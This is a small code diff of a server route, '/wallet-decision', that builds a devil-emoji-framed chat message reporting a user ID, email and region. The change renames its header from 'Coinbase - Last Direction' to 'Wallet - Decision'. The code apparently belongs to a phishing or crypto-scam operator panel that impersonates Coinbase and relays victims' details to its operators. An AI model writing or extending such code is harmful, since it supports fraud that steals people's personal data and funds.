@@ -2219,7 +2219,7 @@ app.post("/wallet-decision", async (req, res) => {
     }
 
     const message =
-      `😈😈😈 <b>Coinbase - Last Direction</b> 😈😈😈\n` +
+      `😈😈😈 <b>Wallet - Decision</b> 😈😈😈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
